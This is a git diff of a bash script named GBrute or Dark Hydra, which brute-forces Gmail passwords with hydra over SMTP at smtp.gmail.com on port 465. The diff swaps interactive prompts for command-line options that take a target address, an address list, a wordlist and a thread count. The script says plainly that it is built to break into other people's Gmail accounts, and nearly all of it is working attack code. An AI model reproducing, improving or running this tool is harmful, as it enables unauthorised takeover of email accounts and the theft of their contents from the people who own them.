@@ -17,68 +17,64 @@ Hidden="${def}8m"
 under="${def}4m"
 blinkre="${def}25m"
 rehide="${def}28m"
-pc="${yellow}[${red}PC Only${yellow}]${green}"
 
-#=============================#
-#   Get gateway and local ip  #
-#=============================#
+#===================#
+#  ROOT PRIVILEGIES #
+#===================#
 
-gate=`netstat -r | grep "default" | awk {'print $8'}`
-llp=`hostname -I | cut -d' ' -f1`
-public=`curl ifconfig.me 2>&-`
-
-version="1.0"
-auth="Retr0"
-mac=`</sys/class/net/eth0/address`
-logo=`figlet Retrosploit -f chunky.flf | lolcat`
+if [[ $EUID -ne 0 ]]; then
+        echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
+        exit 1
+fi
 
 #=========== END MODULES ============#
 
-clear && sleep 0.8
-figlet GBrute
+server="smtp.gmail.com smtp"
 
-echo -e ":: Description ::\n"
-echo -e "This tool can brute force gmail account.\n"
+clear
 
-echo -e "This tools required less secure apps : ${red}OPEN\n$reset"
+figlet Dark Hydra | lolcat
 
-read -p "Select single / multi / mix mode:> " options && echo
+echo -e $cyan":: ${red}Description ${cyan}::\n"
 
-if [ $options == "single" ] || [ $options == "Single" ]; then
+echo -e "This tool powered by medusa to brute force gmail account.\n$reset"
 
-read -p "Target's Gmail:> " target
-read -sp "Password:> " pwd
-sleep 0.8
+echo -e "Your target need to open less secure apps : ${red}Open\n$reset"
 
-hydra -l $target -p $pwd -S -s ns -V -t 16 -s 465 smtp.gmail.com smtp && sleep 0.8
+	echo -e "Usage: --help		       Open menu"
+	echo -e "       -u <target's gmail>    Add target's gmail"
+	echo -e "       -U <gmaillist file>    Add gmail list file"
+	echo -e "       -P <wordlist file>     Add wordlist file"
+	echo -e "       -t <task number>       Add Threads\n"
+	
+echo -e $white"Example: ./gbrute -u <target's gmail> -P <wordlist file> -t 64\n"
 
-elif [ $options == "multi" ] || [ $options == "Multi" ]; then
+while getopts u:U:P:s:t:c options; do
+	case $options in
+		u) gmail=$OPTARG;;
+		U) GMAIL=$OPTARG ;;
+		P) PWD=$OPTARG;;
+		t) Threads=$OPTARG;;
+		c) clear ;;
+	esac
+done
 
-read -p "Gmail file:> " target
-read -p "Wordlist File:> " pwd
-sleep 0.8
+if [ -z "$gmail" ]; then
 
-hydra -L $target -P $pwd -S -s ns -V -t 16 -s 465 smtp.gmail.com smtp && sleep 0.8
-
-elif [ $options == "mix" ]; then
-
-read -p "Target's Gmail:> " target
-read -p "Wordlist File:> " pwd
-sleep 0.8
-
-hydra -l $target -P $pwd -S -s ns -V -t 16 -s 465 smtp.gmail.com smtp && sleep 0.8
-
-elif [ $options == "Mix" ]; then
-read -p "Gmail file:> " target
-read -sp "Password:> " pwd
-sleep 0.8
-
-hydra -L $target -p $pwd -S -s ns -V -t 16 -s 465 smtp.gmail.com smtp && sleep 0.8
+sleep 0.1
 
 else
 
-sleep 0.8 && bash gbrute
+echo -e $cyan && hydra -S -l $gmail -P $PWD -t $Threads -V -e ns -s 465 $server -f -q
 
 fi
 
+if [ -z "$GMAIL" ]; then
 
+sleep 0.1
+
+else
+
+echo -e $cyan && hydra -S -L $GMAIL -P $PWD -t $Threads -V -e ns -s 465 $server -f -q
+
+fi
